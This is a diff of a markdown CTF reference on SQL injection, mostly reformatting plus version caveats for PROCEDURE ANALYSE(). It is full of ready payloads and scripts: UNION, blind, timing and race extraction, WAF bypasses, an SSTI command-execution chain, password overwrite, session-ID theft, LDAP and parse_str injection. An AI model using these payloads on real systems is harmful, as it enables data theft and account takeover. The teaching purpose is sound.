@@ -3,7 +3,6 @@
 Comprehensive SQL injection techniques for CTF challenges. For other server-side attacks (SSTI, SSRF, XXE, command injection, GraphQL), see [server-side.md](server-side.md).
 
 ## Table of Contents
-
 - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
 - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
 - [Second-Order SQL Injection](#second-order-sql-injection)
@@ -20,7 +19,7 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [PHP PCRE Backtrack Limit WAF Bypass (SECUINSIDE 2017)](#php-pcre-backtrack-limit-waf-bypass-secuinside-2017)
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
 - [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
-- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
+- [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57-mariadb-only)
 - [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
 - [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
 - [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
@@ -34,10 +33,9 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)](#sqlite-union-via-x-forwarded-for-with-phpsessid-oracle-ncsc-2019)
 - [Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)](#quote-adjacent-union-keyword-filter-bypass-tamuctf-2019)
 
-------
+---
 
 ## Backslash Escape Quote Bypass
-
 ```bash
 # Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
 # With username=\ : WHERE username='\' AND password='...'
@@ -46,7 +44,6 @@ curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FR
 ```
 
 ## Hex Encoding for Quote Bypass
-
 ```sql
 SELECT 0x6d656f77;  -- Returns 'meow'
 -- Combined with UNION for SSTI injection:
@@ -54,9 +51,7 @@ username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
 ```
 
 ## Second-Order SQL Injection
-
 **Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
-
 1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
 2. Login normally
 3. View profile → injected SQL executes in query using stored username
@@ -85,7 +80,6 @@ s.post("https://target.com/change-password", data={
 **Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.
 
 ## SQLi LIKE Character Brute-Force
-
 ```python
 password = ""
 for pos in range(length):
@@ -112,7 +106,6 @@ curl -X POST http://target/login -d 'login=admin&password=attacker123'
 ```
 
 **Why it works:**
-
 1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
 2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
 3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
@@ -121,9 +114,7 @@ curl -X POST http://target/login -d 'login=admin&password=attacker123'
 **Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.
 
 ## SQLi to SSTI Chain
-
 When SQLi result gets rendered in a template:
-
 ```python
 payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
 hex_payload = '0x' + payload.encode().hex()
@@ -131,32 +122,27 @@ hex_payload = '0x' + payload.encode().hex()
 ```
 
 ## MySQL information_schema.processList Trick
-
 ```sql
 SELECT info FROM information_schema.processList WHERE id=connection_id()
 SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
 ```
 
 ## WAF Bypass via XML Entity Encoding (Crypto-Cat)
-
 When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
-
 ```xml
 <storeId>
   1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
 </storeId>
 ```
-
 This decodes to `1 UNION SELECT username FROM users` after XML processing.
 
 **Encoding reference:**
-
-| Keyword | XML Hex Entities                       |
-| ------- | -------------------------------------- |
-| UNION   | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;`       |
-| SELECT  | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
-| FROM    | `&#x46;&#x52;&#x4f;&#x4d;`             |
-| WHERE   | `&#x57;&#x48;&#x45;&#x52;&#x45;`       |
+| Keyword | XML Hex Entities |
+|---------|-----------------|
+| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
+| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
+| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
+| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |
 
 **Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.
 
@@ -167,7 +153,6 @@ This decodes to `1 UNION SELECT username FROM users` after XML processing.
 **Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL payloads embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.
 
 **Injecting SQL into EXIF fields:**
-
 ```bash
 # Set EXIF Comment field to SQL payload
 exiftool -Comment="' UNION SELECT password FROM users--" image.jpg
@@ -256,7 +241,6 @@ case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end
 ```
 
 **Example scenario:**
-
 ```sql
 -- Application runs two queries with the same injected parameter:
 -- Query 1: SELECT * FROM users WHERE role = [INJECTION]
@@ -300,7 +284,6 @@ Race SQL injection against concurrent requests to leak data from `information_sc
 union select 1,(select INFO from information_schema.processlist
   where INFO like 0x256465637279707425),3,4 from board
 -- The '%decrypt%' hex pattern matches the concurrent query containing the key
-
 ```
 
 ```python
@@ -327,12 +310,11 @@ for _ in range(100):
     t2.start()
     t1.join()
     t2.join()
-
 ```
 
 **Key insight:** `information_schema.processlist.INFO` exposes the full SQL text of all currently running queries on the MySQL server. By racing an injection query against a concurrent application query that references secrets, those secrets can be captured from the process list. This extends the existing `information_schema.processList` trick by adding a timing/race component to capture transient queries that contain secrets (encryption keys, passwords) only visible during execution.
 
-------
+---
 
 ## SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)
 
@@ -350,7 +332,6 @@ id BETWEEN id AND id           -- semantically: id <= id AND id >= id → always
 
 -- When even UNION is blocked, use with conditional:
 id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
-
 ```
 
 ```python
@@ -365,24 +346,21 @@ def sqli_between(position, low_char, high_char):
     )
     r = requests.get("http://target/item", params={"id": payload})
     return "result" in r.text   # truthy response = condition matched
-
 ```
 
 **Combining with schema enumeration when `information_schema` is blocked:**
-
 ```sql
--- PROCEDURE ANALYSE() as alternative (see next technique)
+-- PROCEDURE ANALYSE() as alternative on MySQL ≤5.7 / MariaDB (see next technique)
 SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
-
 ```
 
 **Key insight:** SQL `BETWEEN col AND col` with the same column as both bounds is semantically a tautology but syntactically avoids digit and comparison operator signatures. Combine with string column references for blind extraction when numeric literals and `=`/`<`/`>` are filtered.
 
-------
+---
 
-## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)
+## Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017, MySQL ≤5.7 / MariaDB only)
 
-**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration.
+**Pattern:** The HTTP `Host` header is used in a SQL query (e.g., to log access or resolve virtual hosts) without sanitization. Since Host is rarely tested by WAFs, standard injection techniques work. When `information_schema` is blocked, MySQL's `PROCEDURE ANALYSE()` provides table and column enumeration (MySQL ≤5.7 / MariaDB only — removed in MySQL 8.0.1).
 
 ```bash
 # Test: inject into Host header
@@ -392,10 +370,9 @@ curl -H "Host: ' OR '1'='1'--" http://target/
 # UNION injection via Host header:
 curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/
 
-# When information_schema is blocked, use PROCEDURE ANALYSE():
-curl -H "Host: ' UNION SELECT * FROM users PROCEDURE ANALYSE()-- " http://target/
-# PROCEDURE ANALYSE() returns column types and suggested data types, leaking column names
-
+# When information_schema is blocked, append PROCEDURE ANALYSE() to the running query:
+curl -H "Host: ' PROCEDURE ANALYSE()-- " http://target/
+# PROCEDURE ANALYSE() analyses the result set and returns column metadata, leaking column names
 ```
 
 ```python
@@ -407,40 +384,35 @@ def host_sqli(payload):
     r = requests.get(TARGET, headers={"Host": payload})
     return r.text
 
-# Enumerate tables via PROCEDURE ANALYSE() when information_schema blocked:
-# First: get column names from a known/guessed table
-result = host_sqli("' UNION SELECT username,password FROM users PROCEDURE ANALYSE()-- ")
+# Enumerate columns via PROCEDURE ANALYSE() when information_schema blocked:
+# No UNION column-count matching needed — it analyses the app query's own result set
+result = host_sqli("' PROCEDURE ANALYSE()-- ")
 print(result)
 
 # PROCEDURE ANALYSE() output includes: field names, min/max values, optimal data type
 # This leaks column names, row counts, and sample values
-
 ```
 
 **PROCEDURE ANALYSE() output structure:**
-
 ```sql
 -- Returns rows like:
 -- Field_name: database.table.column
 -- Min_value / Max_value: actual data ranges
 -- Optimal_fieldtype: suggested column type
 -- The "Field_name" column leaks fully qualified column names: db.table.column
-
 ```
 
 **Other Host header injection vectors:**
-
 ```text
 X-Forwarded-For      # logged to DB as client IP
 X-Real-IP            # same
 User-Agent           # logged for analytics
 Referer              # logged for referral tracking
-
 ```
 
-**Key insight:** `PROCEDURE ANALYSE()` is a MySQL-specific alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
+**Key insight:** `PROCEDURE ANALYSE()` is a legacy (MySQL ≤5.7 / MariaDB only, removed in MySQL 8.0.1) alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. On MySQL 8+, use `mysql.innodb_table_stats` instead (see "MySQL innodb_table_stats as information_schema Alternative" below). Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
 
-------
+---
 
 ## SQLite Blind SQLi via randomblob() Timing (SECCON 2017)
 
@@ -455,7 +427,6 @@ admin' and password like 'f%' and 1=randomblob(300000000)--
 admin' and password like 'fl%' and 1=randomblob(300000000)--
 admin' and password like 'fla%' and 1=randomblob(300000000)--
 admin' and password like 'flag%' and 1=randomblob(300000000)--
-
 ```
 
 ```python
@@ -476,12 +447,11 @@ for pos in range(32):
             known += c
             print(f"Found: {known}")
             break
-
 ```
 
 **Key insight:** `randomblob()` generates random data proportional to the argument size, creating measurable delays. This is the SQLite equivalent of MySQL's `SLEEP()` or PostgreSQL's `pg_sleep()`. Adjust the argument (e.g., `300000000`) based on server performance to get a reliable timing difference. Other SQLite delay alternatives include `zeroblob()` and recursive CTEs, but `randomblob()` is the most reliable.
 
-------
+---
 
 ## vsprintf Double-Prepare Format String SQLi (AceBear 2018)
 
@@ -498,7 +468,6 @@ username=39&password=%1$c+or+1=1--+-
 # 3. %1$c converts argument 39 → chr(39) → ' (single quote)
 # 4. Result: WHERE user='' or 1=1-- -' AND pass='...'
 #    → authentication bypass
-
 ```
 
 ```python
@@ -515,12 +484,11 @@ r = requests.post("http://target/login", data={
     "username": "39",
     "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
 })
-
 ```
 
 **Key insight:** `%c` in `vsprintf` converts an integer to a character, bypassing string-level escaping. If user input passes through `vsprintf` twice (once for formatting, once for query building), format specifiers in the first input become SQL injection vectors in the second pass. The key trick is sending `39` as one parameter (ASCII code for single quote) and `%1$c` as another to reference that parameter as a character. Look for PHP code that chains `sprintf`/`vsprintf` with query construction.
 
-------
+---
 
 ### SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)
 
@@ -537,7 +505,6 @@ INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT
 INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
 -- This inserts a row for 'root' and when the UNIQUE constraint on username conflicts,
 -- it updates the existing root user's password to 'l'
-
 ```
 
 ```python
@@ -556,12 +523,11 @@ r = requests.post("http://target/login", data={
     "password": "hacked"
 })
 print(r.text)
-
 ```
 
 **Key insight:** MySQL's `ON DUPLICATE KEY UPDATE` clause in INSERT statements can modify existing rows when a UNIQUE constraint conflicts, enabling password overwrite without SELECT privileges. This is particularly useful when the database user has INSERT but not SELECT permissions, making traditional UNION-based extraction impossible. Look for registration or user creation endpoints with injectable INSERT queries.
 
-------
+---
 
 ### MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)
 
@@ -573,7 +539,6 @@ SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_nam
 
 -- Also available:
 SELECT group_concat(database_name) FROM mysql.innodb_table_stats
-
 ```
 
 ```python
@@ -603,22 +568,19 @@ def blind_extract(url):
 
 tables = blind_extract("http://target/search")
 print(f"Tables: {tables}")
-
 ```
 
 **Other WAF-bypass metadata sources:**
-
 ```sql
 -- mysql.innodb_table_stats: database_name, table_name
 -- mysql.innodb_index_stats: database_name, table_name, index_name
 -- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
 -- sys.x$schema_table_statistics: same, less formatting
-
 ```
 
 **Key insight:** `mysql.innodb_table_stats` contains `database_name` and `table_name` columns, providing an alternative metadata source when `information_schema` access is filtered by WAF rules. Unlike `information_schema`, it only tracks InnoDB tables (not column names), so combine with error-based or blind techniques to discover column names after finding tables.
 
-------
+---
 
 ## SQLi Inline Comment Multi-Field Split (picoCTF 2018)
 
@@ -636,7 +598,6 @@ password = */ OR 1=1 --
 SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
 # After comment removal:
 SELECT * FROM users WHERE name=' OR 1=1 -- '
-
 ```
 
 ```python
@@ -645,14 +606,13 @@ r = requests.post("http://target/login", data={
     "username": "'/*",
     "password": "*/ OR 1=1 -- "
 })
-
 ```
 
 **Key insight:** MySQL `/* ... */` comments span across string delimiters and field boundaries when the filter runs before interpolation, not after. Any validator that checks one field at a time misses the full injected string. When a blocklist hits the username regex but the password field is rendered into the same query, split payloads across both inputs.
 
 **References:** picoCTF 2018 — THE VAULT, writeup 11747
 
-------
+---
 
 ## PHP Full-Width Dollar Regex Anchor Bypass (Hack.lu CTF 2018)
 
@@ -664,19 +624,17 @@ if (preg_match('/^\d+＄/', $input)) { /* accepted */ }
 
 // Payload passes validation and later triggers long-string handling
 $_GET['key2'] = '1337＄' . str_repeat('a', 50);
-
 ```
 
 ```bash
 curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
-
 ```
 
 **Key insight:** Always compare regex special characters by codepoint, not by appearance. Unicode look-alikes of `$`, `^`, `.`, `[`, `]`, `*`, `+`, `?`, `(`, `)` are literals in PCRE and silently downgrade the pattern. Check every anchor in a filter with `hexdump -C` before trusting it.
 
 **References:** Hack.lu CTF 2018 — Baby PHP, writeup 11846
 
-------
+---
 
 ## MySQL REGEXP Byte-by-Byte Oracle + Backtick Comment Bypass (BSides Delhi 2018)
 
@@ -690,7 +648,6 @@ curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
 
 # Iteratively extend the regex prefix:
 ^1 → ^17 → ^172 → ^1729 ...
-
 ```
 
 ```python
@@ -708,14 +665,13 @@ while True:
             break
     else:
         break
-
 ```
 
 **Key insight:** `REGEXP` is rarely on a WAF keyword list and supports anchors (`^`, `$`) and character classes, giving a full byte-by-byte oracle without `AND`, `IF`, or `SUBSTRING`. Backticked column references bypass space stripping because `/**/` comments separate tokens without spaces. Null bytes after the payload truncate the SQL string early in MySQL clients that still honor embedded NULs.
 
 **References:** BSides Delhi CTF 2018 — Old School SQL, writeup 11953
 
-------
+---
 
 ## LDAP Filter Breakout with Wildcard Injection (CSAW 2018)
 
@@ -731,21 +687,19 @@ while True:
 
 # The `&` now only sees (GivenName=*), and the trailing disjunction + leftover
 # negation become ignored extra filter components.
-
 ```
 
 ```python
 import requests
 r = requests.get("http://target/search", params={"name": "*))(|(uid=*"})
 print(r.text)
-
 ```
 
 **Key insight:** LDAP filters use a prefix-notation boolean tree: `&` / `|` / `!` followed by parenthesised children. Unescaped user input that contains `)`, `(`, `*`, or `\` lets the attacker rebalance that tree. Common payloads: `*)(uid=*` (OR wildcard), `*))(&(1=1)` (force true), `foo)(|(password=*)`  (enumerate records). Escape with `\28`, `\29`, `\2a`, `\5c` on the server side.
 
 **References:** CSAW CTF Qualification Round 2018 — ldab, writeup 11207
 
-------
+---
 
 ## PHP parse_str() Variable Injection (TokyoWesterns 2018)
 
@@ -758,20 +712,18 @@ if (md5($password) === $hashed_password) { login(); }
 
 // Safe form
 parse_str($_SERVER['QUERY_STRING'], $params);
-
 ```
 
 ```bash
 # Set the target variable directly from the query string
 curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php -r 'echo md5("anything");')"
-
 ```
 
 **Key insight:** `parse_str()` and `extract()` are register_globals-style primitives: any parameter sent by the client becomes a PHP variable that might shadow logic the developer assumed was local. The fix is always the two-argument form. When auditing PHP, grep for `parse_str\(\s*\$[^,]*\)` with no comma.
 
 **References:** TokyoWesterns CTF 4th 2018 — SimpleAuth, writeup 11034
 
-------
+---
 
 ## ExpressionEngine FileManager ORDER BY Sort-Key SQLi (35C3 2018)
 
@@ -779,7 +731,6 @@ curl "http://target/auth.php?action=auth&password=anything&hashed_password=$(php
 
 ```http
 POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
-
 ```
 
 Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing oracle on the admin password hash.
@@ -788,7 +739,7 @@ Use `sleep()` / `benchmark()` inside the sort expression to run a blind timing o
 
 **References:** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi, writeup 12880
 
-------
+---
 
 ## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)
 
@@ -804,16 +755,14 @@ curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sq
 # Exfiltrate a specific row (session_id for user 5)
 curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
 # -> Set-Cookie: PHPSESSID=<leaked value>
-
 ```
-
 Pad with `null` columns until the UNION fits; place the target expression in the column whose value is reflected in the cookie. Reuse the leaked `session_id` as your own `PHPSESSID` to impersonate the target user (e.g., Maria).
 
 **Key insight:** Session-ID generation logic often includes unsanitized HTTP headers (`X-Forwarded-For`, `Client-IP`, `True-Client-IP`). The reflected row becomes a free oracle: no error-based or time-based inference required. SQLite-specific UNION uses `null` padding and `sqlite_master(type,name,tbl_name,sql)` for schema enumeration (no `information_schema`).
 
 **References:** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria, writeup 13236
 
-------
+---
 
 ## Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)
 
@@ -832,11 +781,10 @@ aggies'UNION SELECT 1; #
 'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
 'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
 'UNION ALL SELECT grantee FROM information_schema.user_privileges #
-
 ```
 
 **Key insight:** Naive blacklists look for whitespace-delimited keywords, but SQL lexers tolerate quote-adjacent tokens — the closing `'` is implicit whitespace to the parser. The same trick works for `/*!50000UNION*/`, tab/newline (`%09`, `%0a`), parentheses (`UNION(SELECT...)`), and comment blocks (`UNION/**/SELECT`). Also probe `information_schema.user_privileges` for the `grantee` column — CTF authors often hide flags as the privileged user's name.
 
 **References:** TAMUctf 2019 — Bird Box Challenge, writeup 13860
 
-------
+---
